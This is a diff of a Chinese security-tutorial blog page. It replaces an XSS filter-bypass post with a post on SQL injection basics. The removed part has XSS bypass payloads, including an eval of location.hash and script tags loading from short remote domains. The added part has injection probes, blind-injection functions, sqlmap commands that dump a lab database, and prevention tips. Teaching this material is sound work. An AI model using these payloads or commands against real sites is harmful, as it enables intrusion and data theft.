@@ -21,20 +21,24 @@
     var CONFIG = {"hostname":"blog.sechelper.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"remove","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="¶绕过 触发xss时遇到有防御措施网站时需要反复调试payload，那么多语法肯定不好记，下面给大家几个网站，里面包含了几乎所有xss语句的备忘录：  burpsuite官方 owasp官方 xss-payload-list  **注意：*部分payload是依赖浏览器版本的，例如在火狐浏览器触发可能在谷歌浏览器未必可以使用，burpsuite官方的备忘录有测试功能，大家多尝试一下。  突破HTM">
+  <meta name="description" content="¶SQL注入的本质 注入攻击的本质: 把用户输入的数据当做代码执行。 两个关键条件：   用户能够控制输入   原本程序要执行的代码，拼接用户输入数据被执行   ¶手工测试 但很多时候，Web服务器关闭了错误回显，这时候我们该怎样实行SQL注入了呢？ ¶判断是否存在注入 二话不说，先加单引号’、双引号”、单括号)、双括号)）等看看是否报错，如果报错就可能存在SQL注入漏洞了。 还有在URL后面加a">
 <meta property="og:type" content="article">
-<meta property="og:title" content="xss Bypass">
-<meta property="og:url" content="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/index.html">
+<meta property="og:title" content="SQL注入的本质">
+<meta property="og:url" content="https://blog.sechelper.com/20230327/penetration-testing-guide/sql-inject-principle/index.html">
 <meta property="og:site_name" content="助安社区 - 极度开放的网络安全自学社区">
-<meta property="og:description" content="¶绕过 触发xss时遇到有防御措施网站时需要反复调试payload，那么多语法肯定不好记，下面给大家几个网站，里面包含了几乎所有xss语句的备忘录：  burpsuite官方 owasp官方 xss-payload-list  **注意：*部分payload是依赖浏览器版本的，例如在火狐浏览器触发可能在谷歌浏览器未必可以使用，burpsuite官方的备忘录有测试功能，大家多尝试一下。  突破HTM">
+<meta property="og:description" content="¶SQL注入的本质 注入攻击的本质: 把用户输入的数据当做代码执行。 两个关键条件：   用户能够控制输入   原本程序要执行的代码，拼接用户输入数据被执行   ¶手工测试 但很多时候，Web服务器关闭了错误回显，这时候我们该怎样实行SQL注入了呢？ ¶判断是否存在注入 二话不说，先加单引号’、双引号”、单括号)、双括号)）等看看是否报错，如果报错就可能存在SQL注入漏洞了。 还有在URL后面加a">
 <meta property="og:locale">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/22/e6513aacacae9659168fd4e8e6bb5079.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/22/8e3bacfc0df300ba6cccec5c529a7558.png">
+<meta property="og:image" content="https://static.sechelper.com/img/2022/11/22/e4ff6f535dee351fc7954a210001475c.png">
 <meta property="article:published_time" content="2023-03-27T01:53:00.000Z">
 <meta property="article:modified_time" content="2023-03-27T02:05:45.758Z">
 <meta property="article:author" content="狗头君师">
 <meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://static.sechelper.com/img/2022/11/22/e6513aacacae9659168fd4e8e6bb5079.png">
 
-<link rel="canonical" href="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/">
+<link rel="canonical" href="https://blog.sechelper.com/20230327/penetration-testing-guide/sql-inject-principle/">
 
 
 <script id="page-configurations">
@@ -47,7 +51,7 @@
   };
 </script>
 
-  <title>xss Bypass | 助安社区 - 极度开放的网络安全自学社区</title>
+  <title>SQL注入的本质 | 助安社区 - 极度开放的网络安全自学社区</title>
   
 
 
@@ -199,7 +203,7 @@ document.getElementById("qrcode-nav").hidden=true
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="cn">
-    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/xss-bypass/">
+    <link itemprop="mainEntityOfPage" href="https://blog.sechelper.com/20230327/penetration-testing-guide/sql-inject-principle/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -212,7 +216,7 @@ document.getElementById("qrcode-nav").hidden=true
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          xss Bypass
+          SQL注入的本质
         </h1>
 
         <div class="post-meta">
@@ -231,11 +235,11 @@ document.getElementById("qrcode-nav").hidden=true
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index"><span itemprop="name">XSS</span></a>
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/%E7%BB%95%E8%BF%87/" itemprop="url" rel="index"><span itemprop="name">绕过</span></a>
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/%E7%BB%95%E8%BF%87/" itemprop="url" rel="index"><span itemprop="name">绕过</span></a>
                 </span>
             </span>
 
@@ -257,38 +261,69 @@ document.getElementById("qrcode-nav").hidden=true
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="绕过"><a class="header-anchor" href="#绕过">¶</a>绕过</h2>
-<p>触发xss时遇到有防御措施网站时需要反复调试payload，那么多语法肯定不好记，下面给大家几个网站，里面包含了几乎所有xss语句的备忘录：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">burpsuite官方</a></li>
-<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">owasp官方</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/payloadbox/xss-payload-list">xss-payload-list</a></li>
-</ul>
-<p>**注意：*部分payload是依赖浏览器版本的，例如在<code>火狐浏览器</code>触发可能在<code>谷歌浏览器</code>未必可以使用，burpsuite官方的备忘录有测试功能，大家多尝试一下。</p>
-<!--morr-->
-<p><strong>突破HTML实体编码</strong></p>
-<ul>
-<li>尖括号过滤绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l8">实验</a></li>
-<li>引号绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l9">实验</a></li>
-<li>大小写绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l10">实验</a></li>
-<li>编码变形绕过 👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a></li>
-</ul>
-<p><strong>突破长度限制</strong></p>
-<ul>
+        <h2 id="SQL注入的本质"><a class="header-anchor" href="#SQL注入的本质">¶</a>SQL注入的本质</h2>
+<p>注入攻击的<em>本质: 把用户输入的数据当做代码执行</em>。</p>
+<p><strong>两个关键条件：</strong></p>
+<ol>
 <li>
-<p>精简payload👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l11">实验</a><br>
-在url中，<code>#</code>后内容不会发送给服务器，利用这个特性可以达到突破长度限制并且隐藏攻击双重目的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onclick=&quot;eval(location.hash.substr(1))&quot;</span><br></pre></td></tr></table></figure>
+<p>用户能够控制输入</p>
 </li>
 <li>
-<p>短域名👉 <a target="_blank" rel="noopener" href="http://edu.vulab.io/xss/labs/l12">实验</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//Ⅻ.₨&gt;</span><br><span class="line">&lt;script src=//⑭.₨&gt;</span><br></pre></td></tr></table></figure>
+<p>原本程序要执行的代码，拼接用户输入数据被执行</p>
 </li>
-</ul>
-<p><strong>更多绕过技巧集合：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://www.freebuf.com/articles/web/244524.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/93192936</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</span><br><span class="line">https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html</span><br><span class="line">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</span><br><span class="line">https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code</span><br><span class="line">https://medium.com/taptuit/minifying-xss-f17d7dc241cf</span><br><span class="line">https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss</span><br><span class="line">https://www.acunetix.com/websitesecurity/cross-site-scripting/</span><br></pre></td></tr></table></figure>
-<p><strong>XSS盲打平台</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xsshunter.com/</span><br></pre></td></tr></table></figure>
+</ol>
+<h2 id="手工测试"><a class="header-anchor" href="#手工测试">¶</a>手工测试</h2>
+<p>但很多时候，Web服务器关闭了错误回显，这时候我们该怎样实行SQL注入了呢？</p>
+<h3 id="判断是否存在注入"><a class="header-anchor" href="#判断是否存在注入">¶</a>判断是否存在注入</h3>
+<p>二话不说，先加单引号’、双引号”、单括号)、双括号)）等看看是否报错，如果报错就可能存在<code>SQL</code>注入漏洞了。<br>
+还有在URL后面加and 1=1,and 1=2看页面是否显示一样，显示不一样的话，在判断是字符型还是数字型，肯定存在SQL注入漏洞了。还有就是<code>Timing Attack</code>测试，也就是时间盲注。有时候通过简单的条件语句比如<code>and 1=2</code>是无法看出异常的。</p>
+<span id="more"></span>
+<p><strong>报错查询注入</strong><br>
+利用前提：页面上没有显示位，但是需要输出SQL语句执行错误信息。</p>
+<p><strong>盲注的类型</strong></p>
+<p>SQL注入常用函数,盲注—般分为三种</p>
+<p><strong>基于布尔型的盲注：</strong></p>
+<p>left(a,b)从左截取a 的前b位：left(database(),1) &gt; ‘s’<br>
+substr(a,b,c)从b位置开始，截取字符串a的c长度<br>
+ascii() 将某个字符转换为ascii值：ascii(substr(user),1,1)=101#<br>
+mid(a,b,c)从位置b开始，截取a字符串的c位 regexp正则表达式的用法<br>
+user()结果位root ，regexp为匹配root的正则表达式：select user()’</p>
+<p><strong>基于时间的盲注：</strong></p>
+<p><code>benchmark(count，expr)</code>函数<br>
+<code>sleep(time)</code>函数<br>
+前者通过将<code>expr</code>语句执行<code> count</code>次来到达延迟的目的，后者是直接延迟time时间<br>
+<code>benchmark</code>是一个内置函数，其作用是来测试一写函数的执行速度，<code>benchmark（）</code>其中有两个参数，<br>
+第一个是执行次数，另一个是要执行的函数或者表达式。</p>
+<p><strong>基于报错注入：</strong></p>
+<p>报错顾名思义，就是使语句报错。报错注入则是注入特殊的语句使报错回显中带上我们需要的信息。报错盲注也是三种盲注中效率最高的，常见的报错回显有三种函数extractvalue()、updatexml()、floor()</p>
+<h2 id="Sqlmap简介"><a class="header-anchor" href="#Sqlmap简介">¶</a>Sqlmap简介</h2>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></p>
+<p>Sqlmap 是一个开源的渗透测试工具，可以用来进行自动化检测，能自动化利用 SQL 注入漏洞的过程，帮助你接管数据库服务器。</p>
+<p><strong>基础命令：</strong></p>
+<p>-u 指定注入点</p>
+<p>–dbs 跑库名</p>
+<p>–tables 跑表名</p>
+<p>–columns 跑字段名</p>
+<p>–dump 枚举数据</p>
+<p><img src="https://static.sechelper.com/img/2022/11/22/e6513aacacae9659168fd4e8e6bb5079.png" alt="image-20221122195227984"></p>
+<p><strong>sqlmap的简单使用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u /Pass-05/index.php --forms --dbs</span><br></pre></td></tr></table></figure>
+<p>跑表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error --tables</span><br></pre></td></tr></table></figure>
+<p>字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag --columns</span><br></pre></td></tr></table></figure>
+<p>出数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u Pass-05/index.php --forms -D post_error -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+<p><strong>BP和Sqlmap联动</strong></p>
+<img src="https://static.sechelper.com/img/2022/11/22/8e3bacfc0df300ba6cccec5c529a7558.png" alt="image-20221122195617983" style="zoom:80%;" />
+<p><img src="https://static.sechelper.com/img/2022/11/22/e4ff6f535dee351fc7954a210001475c.png" alt="image-20221122195711501"></p>
+<h2 id="如何预防sql注入？防止sql注入的方式有哪些？"><a class="header-anchor" href="#如何预防sql注入？防止sql注入的方式有哪些？">¶</a>如何预防sql注入？防止sql注入的方式有哪些？</h2>
+<ol>
+<li>普通用户与系统管理员用户的权限要有严格的区分。</li>
+<li>强迫使用参数化语句</li>
+<li>必要的情况下使用专业的漏洞扫描工具来寻找可能被攻击的点。</li>
+<li>使用预编译</li>
+</ol>
 
     </div>
 
@@ -307,12 +342,12 @@ document.getElementById("qrcode-nav").hidden=true
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/20230327/penetration-testing-guide/sql-inject-principle/" rel="prev" title="SQL注入的本质">
-      <i class="fa fa-chevron-left"></i> SQL注入的本质
+    <a href="/20230327/ctf/volatility%E5%8F%96%E8%AF%81/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
     </a></div>
       <div class="post-nav-item">
-    <a href="/20230327/emergency-response/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%89%8B%E5%86%8C@%E5%8A%A9%E5%AE%89%E7%A4%BE%E5%8C%BA/" rel="next" title="">
-       <i class="fa fa-chevron-right"></i>
+    <a href="/20230327/penetration-testing-guide/xss-bypass/" rel="next" title="xss Bypass">
+      xss Bypass <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
